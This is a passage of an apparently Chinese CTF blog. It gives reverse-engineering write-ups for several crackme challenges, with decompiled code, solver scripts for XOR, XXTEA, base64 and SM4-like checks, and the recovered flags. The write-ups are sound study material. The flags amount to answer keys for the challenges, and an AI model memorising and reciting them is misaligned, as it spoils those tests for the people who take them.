s.add(flag[i]==code[i])print(s.check())m=s.model()print(m)//[flag[4] = 7363777037631763767, flag[3] = 3835203404393046370, flag[1] = 7148951143638579506, flag[2] = 3257850080642543666, flag[0] = 7378644943136451686, flag[5] = 32056]</code></pre><p>整理输出</p><pre><code>code=[7378644943136451686,7148951143638579506,3257850080642543666,      3835203404393046370,7363777037631763767,32056]flag=[0]*6def print_flag(s):    str=&#39;&#39;    for i in range(0,len(s),2):        a=int(s[i:i+2],16)        str+=chr(a)    print(str[::-1],end=&#39;&#39;)for i in range(6):    flag[i]=(hex(code[i]).replace(&#39;0x&#39;,&#39;&#39;))    print_flag(flag[i])//flag&#123;6ff29390-6c20-4c56-ba70-a95758e3d1f8&#125;</code></pre><p>方法二，逆向反解</p><p>思路：细心观察，可以发现，如果数大于0，那么它的第一位一定是0，如果数据小于0，那么第一位是1。且不同的处理方式，也会导致得到的数要么是奇数，要么是偶数，我们就可以根据是奇数还是偶数来写反解脚本。还可以用一个简单的数据来试验一下，然后看看反过来怎么解，用一个byte大小的数就行了。</p><pre><code>if(flag[i]&gt;=0)//第一位是0&#123;    flag[i]=flag[i]&lt;&lt;1;//左位移1位，得到的最后一位是0，是偶数。&#125;else//第一位是1&#123;    flag[i]=flag[i]&lt;&lt;1;    flag[i]=flag[i]^0xB0004B7679FA26B3;//左移1位加上异或，得到最后一位是1，是奇数。&#125;</code></pre><p>脚本</p><pre><code>#include&lt;stdio.h&gt;unsigned __int64 code[6]=&#123;0x0BC8FF26D43536296,0x520100780530EE16,0x4DC0B5EA935F08EC,0x342B90AFD853F450,    0x8B250EBCAA2C3681,0x55759F81A2C68AE4&#125;;//注意是unsigned __int64，因为我们处理时，是根据奇偶，不需要区分有符号还是无符号。int main()&#123;    signed __int64 flag[6];    int i,j;    char ch;    for(i=0;i&lt;6;i++)    &#123;        for(j=0;j&lt;64;j++)        &#123;            if(code[i]&amp;0x1==1)//如果是奇数            &#123;                code[i]=(code[i]^0xB0004B7679FA26B3);                code[i]=(code[i]&gt;&gt;1);                code[i]=code[i]|0x8000000000000000;//一定要确保第一位是1，因为正向加密时，这个数是负数。            &#125;                else//如果是偶数            &#123;                code[i]=(code[i]&gt;&gt;1);//右移1位，第一位变为0，这时候不需要处理第一位，因为正向加密时，第一位一定是0，也就是这个数是正数。            &#125;        &#125;    &#125;    //输出    for(i=0;i&lt;6;i++)    &#123;        for(j=0;j&lt;8;j++)        &#123;            ch=code[i]&amp;0xff;            printf(&quot;%c&quot;,ch);            code[i]=code[i]&gt;&gt;8;                    &#125;    &#125;&#125;//flag&#123;6ff29390-6c20-4c56-ba70-a95758e3d1f8&#125;</code></pre><h2 id="seven"><a href="#seven" class="headerlink" title="seven"></a>seven</h2><p>驱动迷宫题，注意键盘码就行<a href="https://blog.csdn.net/wguoyong/article/details/5678511">https://blog.csdn.net/wguoyong/article/details/5678511</a>。</p><p>打印出迷宫，</p><pre><code>#include&lt;stdio.h&gt;int main(void)&#123;    int a[14][16]=&#123; 0x2A, 0x2A, 0x2A, 0x2A, 0x2A, 0x2A, 0x2A, 0x2A, 0x2A, 0x2A,   0x2A, 0x2A, 0x2A, 0x2A, 0x2A, 0x2A, 0x6F, 0x2E, 0x2E, 0x2E,   0x2E, 0x2E, 0x2E, 0x2E, 0x2E, 0x2E, 0x2E, 0x2E, 0x2E, 0x2E,   0x2E, 0x2A, 0x2A, 0x2A, 0x2A, 0x2A, 0x2A, 0x2A, 0x2A, 0x2A,   0x2A, 0x2A, 0x2A, 0x2A, 0x2A, 0x2A, 0x2E, 0x2A, 0x2A, 0x2A,   0x2A, 0x2A, 0x2A, 0x2A, 0x2A, 0x2A, 0x2A, 0x2A, 0x2A, 0x2A,   0x2E, 0x2E, 0x2E, 0x2A, 0x2A, 0x2A, 0x2A, 0x2A, 0x2A, 0x2A,   0x2A, 0x2A, 0x2A, 0x2A, 0x2A, 0x2E, 0x2E, 0x2A, 0x2A, 0x2A,   0x2A, 0x2A, 0x2A, 0x2A, 0x2A, 0x2A, 0x2A, 0x2A, 0x2A, 0x2A,   0x2E, 0x2E, 0x2A, 0x2A, 0x2A, 0x2A, 0x2A, 0x2A, 0x2A, 0x2A,   0x2A, 0x2A, 0x2A, 0x2A, 0x2A, 0x2E, 0x2E, 0x2A, 0x2A, 0x2A,   0x2A, 0x2A, 0x2A, 0x2A, 0x2A, 0x2A, 0x2A, 0x2A, 0x2A, 0x2A,   0x2E, 0x2E, 0x2A, 0x2A, 0x2A, 0x2A, 0x2A, 0x2A, 0x2A, 0x2A,   0x2A, 0x2A, 0x2A, 0x2A, 0x2A, 0x2E, 0x2E, 0x2A, 0x2A, 0x2A,   0x2A, 0x2A, 0x2A, 0x2A, 0x2A, 0x2A, 0x2A, 0x2A, 0x2A, 0x2A,   0x2E, 0x2E, 0x2A, 0x2A, 0x2A, 0x2A, 0x2A, 0x2A, 0x2A, 0x2A,   0x2A, 0x2A, 0x2A, 0x2A, 0x2A, 0x2E, 0x2E, 0x2A, 0x2A, 0x2A,   0x2A, 0x2A, 0x2A, 0x2A, 0x2A, 0x2A, 0x2A, 0x2A, 0x2A, 0x2A,   0x2E, 0x2E, 0x2A, 0x2A, 0x2A, 0x2A, 0x2A, 0x2A, 0x2A, 0x2A,   0x2A, 0x2A, 0x2A, 0x2A, 0x2A, 0x2A, 0x37, 0x2A, 0x2A, 0x2A,   0x2A, 0x2A, 0x2A, 0x2A, 0x2A, 0x2A, 0x2A, 0x2A, 0x2A, 0x2A,   0x2A, 0x2A, 0x2A, 0x2A, 0x2A, 0x2A, 0x2A, 0x2A, 0x2A, 0x2A,   0x2A, 0x2A, 0x2A, 0x2A &#125;;   int i,j;   for(i=0;i&lt;14;i++)   &#123;           for(j=0;j&lt;15;j++)           &#123;               printf(&quot;%c&quot;,a[i][j]);        &#125;        printf(&quot;\n&quot;);   &#125;&#125; ***************o..............**************.************...***********..************..************..************..************..************..************..************..*************7*************************//hctf&#123;ddddddddddddddssaasasasasasasasasas&#125;</code></pre><h2 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h2><p>一个windows逆向，考点比较简单。</p><p>主函数逻辑<br><img src="https://i.loli.net/2021/05/03/f18i4dtAb2h6yJm.png"><br>进入处理函数<br><img src="https://i.loli.net/2021/05/03/I6cnaxsOTRNSXiB.png"><br>写出脚本</p><pre><code>#include&lt;stdio.h&gt; unsigned char  sub_401460(unsigned char a1[], int a2)&#123;  char v2; // al  char v3; // cl  int v4; // eax  int v5; // edx  v2 = a1[a2];  v3 = a1[a2+1];  if ( (unsigned __int8)(v2 - 48) &gt; 9u )    v2 -= 55;  v4 = v2 &amp; 0xF;  v5 = (v3 - 55) &amp; 0xF;  if ( (unsigned __int8)(v3 - 48) &lt;= 9u )    v5 = v3 &amp; 0xF;  return v5 | (16 * v4);&#125;int main()&#123;     unsigned char key[]=&quot;1A2F943C4D8C5B6EA3C9BCAD7E&quot;;     char code[]=&#123;0x0F, 0x87, 0x62, 0x14, 0x01, 0xC6, 0xF0, 0x21, 0x30, 0x11, 0x50, 0xD0, 0x82, 0x23, 0xAE, 0x23,0xEE, 0xA9, 0xB4, 0x52, 0x78, 0x57, 0x0C, 0x86, 0x8B&#125;;     int i;     unsigned char flag[25],mid;     for(i=0;i!=25;i++)     &#123;         mid=sub_401460(key,i);         flag[i]=mid^code[i];     &#125;     for(i=0;i&lt;25;i++)     &#123;         flag[i]=((flag[i]&gt;&gt;2)&amp;0xff)|((flag[i]&lt;&lt;6)&amp;0xff);     &#125;    printf(&quot;%s&quot;,flag);&#125;//EIS&#123;ea3y_r7Eve0rSe_r1ghT&#125; </code></pre><h2 id="Re150"><a href="#Re150" class="headerlink" title="Re150"></a>Re150</h2><p>一个elf文件，文件需要动调来看，存在smc，和很多花指令。</p><p>先是smc<br><img src="https://i.loli.net/2021/05/28/cK6yvFo7TbalzWN.png"><br>然后找到主函数，并且去掉里面的花，很多都是E8，还有一些是很多字节码都没用的部分。得到主函数如下。<br><img src="https://i.loli.net/2021/05/28/ukWhsDLoZNEBlmt.png"><br>然后加密部分<br><img src="https://i.loli.net/2021/05/28/CZ6IchbzAf5neB4.png"></p><p>脚本</p><pre><code>#include&lt;stdio.h&gt;int main(void)&#123;    unsigned char flag[]=&#123;  0x73, 0x8D, 0xF2, 0x4C, 0xC7, 0xD4, 0x7B, 0xF7, 0x18, 0x32,   0x71, 0x0D, 0xCF, 0xDC, 0x67, 0x4F, 0x7F, 0x0B, 0x6D&#125;;      int i;      for(i=0;i&lt;20;i++)      &#123;          flag[i]=flag[i]^0x20;          flag[i]=flag[i]^i;          flag[i]= (flag[i] &lt;&lt;(i%8)) |(flag[i]&gt;&gt;(8-i%8));          printf(&quot;%c&quot;,flag[i]);    &#125;&#125;//SYC&#123;&gt;&gt;Wh06m1&gt;&gt;R0Ot&#125;</code></pre><h2 id="babyre1"><a href="#babyre1" class="headerlink" title="babyre1"></a>babyre1</h2><p>考察点，xxtea加密解密，还有md5加密，爆破，和细节约束条件。</p><p>主函数<br><img src="https://i.loli.net/2021/06/02/EdigPjOBGFJV7b3.png"><br>加密函数内部<br><img src="https://i.loli.net/2021/06/02/6mQBvZR7FqWt5cj.png"></p><p>题目中，还有个判断就是，md5(rctf{(input)})=5f8243a662cf71bf31d2b2602638dc1d</p><p>所以写脚本的大概思路就是根据密文Bingo!^0x17，来先得到解密前的6个字节，然后爆破剩下的两个字节，然后进行xxtea解密，将解密后的8个字节，套上格式rctf{}，进行md5加密，然后和md5数据进行比较。</p><p>脚本，其中的md5.c来自GitHub。</p><pre><code>#include&lt;stdio.h&gt;#include &quot;MD5.c&quot;#include&lt;string.h&gt;void encrypt(unsigned int *flag ,unsigned int *key ,unsigned int n)&#123;    unsigned int next,end,sum;    unsigned int rounds,e,delta=0x9e3779b9;    int i;    rounds=6+52/n;//轮回的次数    sum=0;    end=flag[n-1];//先设置end的值为最后一个，因为加密第一个要用    do    &#123;        sum+=delta;        e=(sum&gt;&gt;2)&amp;3;//与key的值关;        for(i=0;i&lt;n-1;i++)//加密第一个到倒数第二个        &#123;            next=flag[i+1];            flag[i]+=(( (end&gt;&gt;5^next&lt;&lt;2)  + (next&gt;&gt;3^end&lt;&lt;4) ) ^ ( (sum^next) + (key[(i&amp;3)^e]^end) ));            end=flag[i];//现在用end来保存当前数据的值，为下一个数据的加密做准备。        &#125;        next=flag[0];//将第一个数据给next，为加密最后一个数据做准备，这时候end的值为倒数第二个数据。        flag[n-1]+=(( (end&gt;&gt;5^next&lt;&lt;2)  + (next&gt;&gt;3^end&lt;&lt;4) ) ^ ( (sum^next) + (key[(i&amp;3)^e]^end) ));        end=flag[n-1];//继续设置end的值为最后一个数据，为新一轮加密做准备。    &#125;while(--rounds);&#125;void decrypt(unsigned int *code ,unsigned int *key ,unsigned int n)&#123;    unsigned int next,end,sum;    unsigned int rounds,e,delta=0x9e3779b9;    int i;    rounds=6+52/n;    sum=rounds*delta;        next=code[0];//设置next为code的第一个     do    &#123;        e=(sum&gt;&gt;2)&amp;3;        for(i=n-1;i&gt;0;i--)//解密最后一个到第二个        &#123;            end=code[i-1];            code[i]-=(( (end&gt;&gt;5^next&lt;&lt;2)  + (next&gt;&gt;3^end&lt;&lt;4) ) ^ ( (sum^next) + (key[(i&amp;3)^e]^end) ));            next=code[i];        &#125;        end=code[n-1];        code[0]-=(( (end&gt;&gt;5^next&lt;&lt;2) + (next&gt;&gt;3^end&lt;&lt;4) ) ^ ( (sum^next) +(key[i&amp;3^e]^end) ));        next=code[0];        sum-=delta;    &#125;while(--rounds);&#125;int main()&#123;    unsigned int key[4]=&#123;0x0E0C7E0C7,0x0C6F1D3D7,0x0C6D3C6D3,0x0C4D0D2CE&#125;;    char hex[16]=&#123;&#39;0&#39;,&#39;1&#39;,&#39;2&#39;,&#39;3&#39;,&#39;4&#39;,&#39;5&#39;,&#39;6&#39;,&#39;7&#39;,&#39;8&#39;,&#39;9&#39;,&#39;a&#39;,&#39;b&#39;,&#39;c&#39;,&#39;d&#39;,&#39;e&#39;,&#39;f&#39;&#125;;    unsigned int n=2;    int i,j,k,m,q,x,num,z;    for(i=0;i&lt;=4;i++)    &#123;        for(j=0;j&lt;0xff;j++)        &#123;            unsigned int code[2]=&#123;0x70797e55,0x00003678&#125;;            code[1]=code[1]|(i&lt;&lt;24)|(j&lt;&lt;16);            encrypt(code,key,n);            unsigned char flag[22]=&quot;rctf&#123;&quot;;            num=0;            for(m=0;m&lt;2;m++)            &#123;                for(q=0;q&lt;4;q++)                &#123;                    flag[5+num]=hex[(*((char*)&amp;code[m]+q)&amp;0xff)&gt;&gt;4];                    flag[5+num+1]=hex[(*((char*)&amp;code[m]+q)&amp;0xff)&amp;0xf];                     num+=2;                &#125;            &#125;            flag[21]=125;            char flag_md5[33]=&#123;0&#125;;            unsigned char  res[23]=&#123;0&#125;;            md5((uint8_t*)flag, 22, res);            for(int x=0;x&lt;16;x++)            &#123;                sprintf(flag_md5+2*x,&quot;%02x&quot;,res[x]);                &#125;                if(!strcmp(flag_md5,&quot;5f8243a662cf71bf31d2b2602638dc1d&quot;))            &#123;                printf(&quot;flag:%s&quot;,flag);            &#125;        &#125;    &#125;&#125;//flag:rctf&#123;05e8a376e4e0446e&#125;</code></pre><h2 id="easyRE"><a href="#easyRE" class="headerlink" title="easyRE"></a>easyRE</h2><p>这道题，和buu上的一样，直接复制过来了</p><p>下载文件用ida打开，shift+12；<br><img src="https://i.loli.net/2020/12/11/e1Zowna3kmUCTYL.png"><br>找到重要代码</p><pre><code>  unsigned __int64 v54; // [rsp+108h] [rbp-18h]  v54 = __readfsqword(0x28u);  v12 = 73;  v13 = 111;  v14 = 100;  v15 = 108;  v16 = 62;  v17 = 81;  v18 = 110;  v19 = 98;  v20 = 40;  v21 = 111;  v22 = 99;  v23 = 121;  v24 = 127;  v25 = 121;  v26 = 46;  v27 = 105;  v28 = 127;  v29 = 100;  v30 = 96;  v31 = 51;  v32 = 119;  v33 = 125;  v34 = 119;  v35 = 101;  v36 = 107;  v37 = 57;  v38 = 123;  v39 = 105;  v40 = 121;  v41 = 61;  v42 = 126;  v43 = 121;  v44 = 76;  v45 = 64;  v46 = 69;  v47 = 67;  memset(v48, 0, sizeof(v48));  v49 = 0;  v50 = 0;  sub_4406E0(0LL, v48, 37LL);  v50 = 0;  if ( sub_424BA0(v48) == 36 )  &#123;    for ( i = 0; i &lt; (unsigned __int64)sub_424BA0(v48); ++i )    &#123;      if ( (unsigned __int8)(v48[i] ^ i) != *(&amp;v12 + i) )//v48是自己输入的，*(&amp;v12 + i)就相当于一个数组，从v12到v47，一共36个数。简单的异或。      &#123;        result = 4294967294LL;        goto LABEL_13;      &#125;    &#125;    sub_410CC0(&quot;continue!&quot;);    memset(&amp;v51, 0, 0x40uLL);    v53 = 0;    sub_4406E0(0LL, &amp;v51, 64LL);    v52 = 0;    if ( sub_424BA0(&amp;v51) == 39 )    &#123;      v1 = sub_400E44(&amp;v51);      v2 = sub_400E44(v1);      v3 = sub_400E44(v2);      v4 = sub_400E44(v3);      v5 = sub_400E44(v4);      v6 = sub_400E44(v5);      v7 = sub_400E44(v6);      v8 = sub_400E44(v7);      v9 = sub_400E44(v8);      v10 = sub_400E44(v9);      if ( !(unsigned int)sub_400360(v10, off_6CC090) )      &#123;        sub_410CC0(&quot;You found me!!!&quot;);        sub_410CC0(&quot;bye bye~&quot;);      &#125;      result = 0LL;    &#125;    else    &#123;      result = 4294967293LL;    &#125;  &#125;  else  &#123;    result = 0xFFFFFFFFLL;  &#125;LABEL_13:  if ( __readfsqword(0x28u) != v54 )    sub_444020();  return result;&#125;</code></pre><p>先看这一部分</p><pre><code>if ( sub_424BA0(v48) == 36 )  &#123;    for ( i = 0; i &lt; (unsigned __int64)sub_424BA0(v48); ++i )    &#123;      if ( (unsigned __int8)(v48[i] ^ i) != *(&amp;v12 + i) )//v48是自己输入的，*(&amp;v12 + i)就相当于一个数组，从v12到v47，一共36个数。简单的异或。      &#123;        result = 4294967294LL;        goto LABEL_13;      &#125;    &#125;</code></pre><p>写出脚本</p><pre><code>#include&lt;stdio.h&gt;int main(void)&#123;    int a[36]=&#123;73,111,100,108,62,81,110,98,40,111,99,121,127,121,46,105,127,100,96,51,119,125,119,101,107,57,123,105,121,61,126,121,76,64,69,67&#125;;         int i;    for(i=0;i&lt;36;i++)    &#123;        a[i]=a[i]^i;        printf(&quot;%c&quot;,a[i]);     &#125; &#125; </code></pre><p>得到<br><img src="https://i.loli.net/2020/12/11/9zfNW3A4sLdRIbn.png"><br>它说：前四个字符是“flag”，现在还不知道意思。</p><p>继续看</p><pre><code>    memset(&amp;v51, 0, 0x40uLL);//定义了一个数组叫v51    v53 = 0;    sub_4406E0(0LL, &amp;v51, 64LL);    v52 = 0;    if ( sub_424BA0(&amp;v51) == 39 )//v61长度是39    &#123;      v1 = sub_400E44(&amp;v51);//对v51base64编码      v2 = sub_400E44(v1);//对v1base64编码      v3 = sub_400E44(v2);      v4 = sub_400E44(v3);      v5 = sub_400E44(v4);      v6 = sub_400E44(v5);      v7 = sub_400E44(v6);      v8 = sub_400E44(v7);      v9 = sub_400E44(v8);      v10 = sub_400E44(v9);      if ( !(unsigned int)sub_400360(v10, off_6CC090) )将v10和off_6CC090对比。      &#123;        sub_410CC0(&quot;You found me!!!&quot;);        sub_410CC0(&quot;bye bye~&quot;);      &#125;</code></pre><p>整个过程就是一个不断base64编码的过程，进行了10次，得到了off_6CC090，也就是</p><pre><code>Vm0wd2VHUXhTWGhpUm1SWVYwZDRWVll3Wkc5WFJsbDNXa1pPVlUxV2NIcFhhMk0xVmpKS1NHVkdXbFpOYmtKVVZtcEtTMUl5VGtsaVJtUk9ZV3hhZVZadGVHdFRNVTVYVW01T2FGSnRVbGhhVjNoaFZWWmtWMXBFVWxSTmJFcElWbTAxVDJGV1NuTlhia0pXWWxob1dGUnJXbXRXTVZaeVdrWm9hVlpyV1hwV1IzaGhXVmRHVjFOdVVsWmlhMHBZV1ZSR1lWZEdVbFZTYlhSWFRWWndNRlZ0TVc5VWJGcFZWbXR3VjJKSFVYZFdha1pXWlZaT2NtRkhhRk5pVjJoWVYxZDBhMVV3TlhOalJscFlZbGhTY1ZsclduZGxiR1J5VmxSR1ZXSlZjRWhaTUZKaFZqSktWVkZZYUZkV1JWcFlWV3BHYTFkWFRrZFRiV3hvVFVoQ1dsWXhaRFJpTWtsM1RVaG9hbEpYYUhOVmJUVkRZekZhY1ZKcmRGTk5Wa3A2VjJ0U1ExWlhTbFpqUldoYVRVWndkbFpxUmtwbGJVWklZVVprYUdFeGNHOVhXSEJIWkRGS2RGSnJhR2hTYXpWdlZGVm9RMlJzV25STldHUlZUVlpXTlZadE5VOVdiVXBJVld4c1dtSllUWGhXTUZwell6RmFkRkpzVWxOaVNFSktWa1phVTFFeFduUlRhMlJxVWxad1YxWnRlRXRXTVZaSFVsUnNVVlZVTURrPQ==</code></pre><p>直接网上解码10次，发现是<a href="https://bbs.pediy.com/thread-254172.htm">https://bbs.pediy.com/thread-254172.htm</a>，居然是一个网站。。。。无情被欺骗。最后通过看wp，发现真正的算法在<br><img src="https://i.loli.net/2020/12/11/8SeKL1W6wEzcDyo.png"><br>得到代码</p><pre><code>unsigned __int64 __fastcall sub_400D35(__int64 a1, __int64 a2)&#123;  __int64 v2; // rdx  __int64 v3; // rdx  __int64 v4; // rdx  unsigned __int64 result; // rax  unsigned __int64 v6; // rt1  unsigned int v7; // [rsp+Ch] [rbp-24h]  signed int i; // [rsp+10h] [rbp-20h]  signed int j; // [rsp+14h] [rbp-1Ch]  unsigned int v10; // [rsp+24h] [rbp-Ch]  unsigned __int64 v11; // [rsp+28h] [rbp-8h]  v11 = __readfsqword(0x28u);  v7 = sub_43FD20() - qword_6CEE38;  for ( i = 0; i &lt;= &#39;\x04�&#39;; ++i )  &#123;    sub_40F790(v7);    sub_40FE60(v7, a2, v2);    sub_40FE60(v7, a2, v3);    v7 = (unsigned __int64)sub_40FE60(v7, a2, v4) ^ 2557891634;  &#125;  v10 = v7;  if ( ((unsigned __int8)v7 ^ byte_6CC0A0[0]) == &#39;f&#39; &amp;&amp; (HIBYTE(v10) ^ (unsigned __int8)byte_6CC0A3) == &#39;g&#39; )//这里的f和g是不是有点熟悉，再联系一下前面的提示：前四个字符是“flag”，通过这个来求key。  &#123;    for ( j = 0; j &lt;= 24; ++j )      sub_410E90((unsigned __int8)(byte_6CC0A0[j] ^ *((_BYTE *)&amp;v10 + j % 4)));//加密算法，key实际上就是那个v10，通过j % 4，又可以知道，v10只有4个。  &#125;  v6 = __readfsqword(0x28u);  result = v6 ^ v11;  if ( v6 != v11 )    sub_444020();  return result;&#125;</code></pre><p>byte_6CC0A0[25]={0x40,0x35,0x20,0x56,0x5d,0x18,0x22,0x45,0x17,0x2f,0x24,0x6e,0x62,0x3c,0x27,0x54,0x48,0x6c,0x24,0x6e,0x72,0x3c,0x32,0x45,0x5b};</p><p>写出脚本</p><pre><code>#include&lt;stdio.h&gt;int main(void)&#123;    int a[36]=&#123;73,111,100,108,62,81,110,98,40,111,99,121,127,121,46,105,127,100,96,51,119,125,119,101,107,57,123,105,121,61,126,121,76,64,69,67&#125;;     int key[4]=&#123;&#39;f&#39;,&#39;l&#39;,&#39;a&#39;,&#39;g&#39;&#125; ;    int byte_6CC0A0[25]=&#123;0x40,0x35,0x20,0x56,0x5d,0x18,0x22,0x45,0x17,0x2f,0x24,0x6e,0x62,0x3c,0x27,0x54,0x48,0x6c,0x24,0x6e,0x72,0x3c,0x32,0x45,0x5b&#125;;    int i,j;    for(i=0;i&lt;36;i++)    &#123;        a[i]=a[i]^i;        printf(&quot;%c&quot;,a[i]);     &#125;    printf(&quot;\n&quot;);     for(i=0;i&lt;4;i++)//通过前4个字符，也就是flag，求出key。    &#123;        key[i]=key[i]^byte_6CC0A0[i];    &#125;    for(j=0;j&lt;25;j++)//用key来解密。    &#123;        byte_6CC0A0[j]=byte_6CC0A0[j]^key[j%4];        printf(&quot;%c&quot;,byte_6CC0A0[j]);    &#125; &#125; </code></pre><p>得到flag{Act1ve_Defen5e_Test}</p><h2 id="babyre"><a href="#babyre" class="headerlink" title="babyre"></a>babyre</h2><p>题目设置了3个password，第一个是3维迷宫，第二个是base64解密，第3个是类似sm4的加密过程。</p><p>3维迷宫<br><img src="https://i.loli.net/2021/06/03/x3hgB68ZMuPfV4c.png"><br>画出3维迷宫</p><pre><code>#include&lt;stdio.h&gt;//ddwwxxssxaxwwaasasyywwddint main()&#123;    char map[]=&quot;**************.****.**s..*..******.****.***********..***..**..#*..***..***.********************.**..*******..**...*..*.*.**.*&quot;;    int i;    for(i=0;i&lt;125;i++)    &#123;        printf(&quot;%c &quot;,map[i]);        if((i+1)%5==0)        &#123;            printf(&quot;\n&quot;);        &#125;        if((i+1)%25==0)        &#123;            printf(&quot;\n&quot;);            &#125;    &#125;&#125;* * * * *     * . . * *      * . . * *      * * * * *      * * * * ** * * * *     * * * * .      * . . * *      * * * * *      * * . . ** * * * .     * * * * .      . . # * .      * * * * *      * . . . ** * * * .     * * * * *      . * * * .      * * * * *      . . * . ** * s . .     * * * * *      . * * * .      . * * . .      . * * . *</code></pre><p>第二部分，base64解密过程，应该是把表给隐藏了，动调应该可以看到。<br><img src="https://i.loli.net/2021/06/03/23fyaXTgUZbIJCs.png"><br>脚本</p><pre><code>import base64url = &#39;sctf_9102&#39;date = url.encode(&quot;utf-8&quot;)st = base64.b64encode(date)print(st)#c2N0Zl85MTAy</code></pre><p>第3部分，也是比较难的一部分，类似sm4加密过程。<br><img src="https://i.loli.net/2021/06/03/bPk9YyRc5ONL4BX.png"><br>要逆这个算法，想了很久，分析发现其实和数组内异或加密是差不多的，我们假设生成的30个数为v1~v30，我们可以知道v30=v26^sub_1464(v27 ^ v28 ^ v29)，现在密文已知，相当于v27，v28，v29，v30是已知，所以可以求得v26，然后可以求得v25…..直到最后求出开始的4个数，然后转为char。</p><p>这个还可以不写算法，直接用题目中的，只需要将开始的4个数改为密文(注意顺序就行)，就可以得到明文。<br><img src="https://i.loli.net/2021/06/03/64nGVTQLZmM8lWX.png"><br>网上找的脚本如下</p><pre><code>aaa = [0xbe040680,0xc5af7647,0x9fcc401f,0xd8bf92ef]d = [0x000000D6, 0x00000090, 0x000000E9, 0x000000FE, 0x000000CC, 0x000000E1, 0x0000003D, 0x000000B7, 0x00000016, 0x000000B6, 0x00000014, 0x000000C2, 0x00000028, 0x000000FB, 0x0000002C, 0x00000005, 0x0000002B, 0x00000067, 0x0000009A, 0x00000076, 0x0000002A, 0x000000BE, 0x00000004, 0x000000C3, 0x000000AA, 0x00000044, 0x00000013, 0x00000026, 0x00000049, 0x00000086, 0x00000006, 0x00000099, 0x0000009C, 0x00000042, 0x00000050, 0x000000F4, 0x00000091, 0x000000EF, 0x00000098, 0x0000007A, 0x00000033, 0x00000054, 0x0000000B, 0x00000043, 0x000000ED, 0x000000CF, 0x000000AC, 0x00000062, 0x000000E4, 0x000000B3, 0x0000001C, 0x000000A9, 0x000000C9, 0x00000008, 0x000000E8, 0x00000095, 0x00000080, 0x000000DF, 0x00000094, 0x000000FA, 0x00000075, 0x0000008F, 0x0000003F, 0x000000A6, 0x00000047, 0x00000007, 0x000000A7, 0x000000FC, 0x000000F3, 0x00000073, 0x00000017, 0x000000BA, 0x00000083, 0x00000059, 0x0000003C, 0x00000019, 0x000000E6, 0x00000085, 0x0000004F, 0x000000A8, 0x00000068, 0x0000006B, 0x00000081, 0x000000B2, 0x00000071, 0x00000064, 0x000000DA, 0x0000008B, 0x000000F8, 0x000000EB, 0x0000000F, 0x0000004B, 0x00000070, 0x00000056, 0x0000009D, 0x00000035, 0x0000001E, 0x00000024, 0x0000000E, 0x0000005E, 0x00000063, 0x00000058, 0x000000D1, 0x000000A2, 0x00000025, 0x00000022, 0x0000007C, 0x0000003B, 0x00000001, 0x00000021, 0x00000078, 0x00000087, 0x000000D4, 0x00000000, 0x00000046, 0x00000057, 0x0000009F, 0x000000D3, 0x00000027, 0x00000052, 0x0000004C, 0x00000036, 0x00000002, 0x000000E7, 0x000000A0, 0x000000C4, 0x000000C8, 0x0000009E, 0x000000EA, 0x000000BF, 0x0000008A, 0x000000D2, 0x00000040, 0x000000C7, 0x00000038, 0x000000B5, 0x000000A3, 0x000000F7, 0x000000F2, 0x000000CE, 0x000000F9, 0x00000061, 0x00000015, 0x000000A1, 0x000000E0, 0x000000AE, 0x0000005D, 0x000000A4, 0x0000009B, 0x00000034, 0x0000001A, 0x00000055, 0x000000AD, 0x00000093, 0x00000032, 0x00000030, 0x000000F5, 0x0000008C, 0x000000B1, 0x000000E3, 0x0000001D, 0x000000F6, 0x000000E2, 0x0000002E, 0x00000082, 0x00000066, 0x000000CA, 0x00000060, 0x000000C0, 0x00000029, 0x00000023, 0x000000AB, 0x0000000D, 0x00000053, 0x0000004E, 0x0000006F, 0x000000D5, 0x000000DB, 0x00000037, 0x00000045, 0x000000DE, 0x000000FD, 0x0000008E, 0x0000002F, 0x00000003, 0x000000FF, 0x0000006A, 0x00000072, 0x0000006D, 0x0000006C, 0x0000005B, 0x00000051, 0x0000008D, 0x0000001B, 0x000000AF, 0x00000092, 0x000000BB, 0x000000DD, 0x000000BC, 0x0000007F, 0x00000011, 0x000000D9, 0x0000005C, 0x00000041, 0x0000001F, 0x00000010, 0x0000005A, 0x000000D8, 0x0000000A, 0x000000C1, 0x00000031, 0x00000088, 0x000000A5, 0x000000CD, 0x0000007B, 0x000000BD, 0x0000002D, 0x00000074, 0x000000D0, 0x00000012, 0x000000B8, 0x000000E5, 0x000000B4, 0x000000B0, 0x00000089, 0x00000069, 0x00000097, 0x0000004A, 0x0000000C, 0x00000096, 0x00000077, 0x0000007E, 0x00000065, 0x000000B9, 0x000000F1, 0x00000009, 0x000000C5, 0x0000006E, 0x000000C6, 0x00000084, 0x00000018, 0x000000F0, 0x0000007D, 0x000000EC, 0x0000003A, 0x000000DC, 0x0000004D, 0x00000020, 0x00000079, 0x000000EE, 0x0000005F, 0x0000003E, 0x000000D7, 0x000000CB, 0x00000039, 0x00000048, 0x000000C6, 0x000000BA, 0x000000B1, 0x000000A3, 0x00000050, 0x00000033, 0x000000AA, 0x00000056, 0x00000097, 0x00000091, 0x0000007D, 0x00000067, 0x000000DC, 0x00000022, 0x00000070, 0x000000B2, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, ]for i in range(len(d)):    if d[i] == 0xa6:        print idef pass3_re(x):    x &amp;= 0xffffffff    a = d[x&amp;0xff]     b = (d[(x&amp;0xffff)&gt;&gt;8]&lt;&lt;8)     c = (d[(x&amp;0xffffff)&gt;&gt;16]&lt;&lt;16)     e = (d[(x&amp;0xffffffff)&gt;&gt;24]&lt;&lt;24)    x = a|b|c|e     x &amp;= 0xffffffff    a = (((x&lt;&lt;12)|(x&gt;&gt;20))&amp;0xffffffff)     b = (((x&gt;&gt;6)|(x&lt;&lt;26))&amp;0xffffffff)     c = (((x&lt;&lt;8)|(x&gt;&gt;24))&amp;0xffffffff)     e = (((x&gt;&gt;2)|(x&lt;&lt;30))&amp;0xffffffff)    x = a^b^c^e    return x&amp;0xffffffffl = []for i in range(30 - 4):    l.append(0)for i in aaa:    l.append(i)cx = 25for i in range(26):    l[cx] = pass3_re(l[cx+1] ^ l[cx+2] ^ l[cx+3]) ^ l[cx+4]    cx -= 1pass3 = &#39;&#39;for i in range(4):    pass3  += (hex(l[i])[2:]).decode(&#39;hex&#39;)[::-1]print 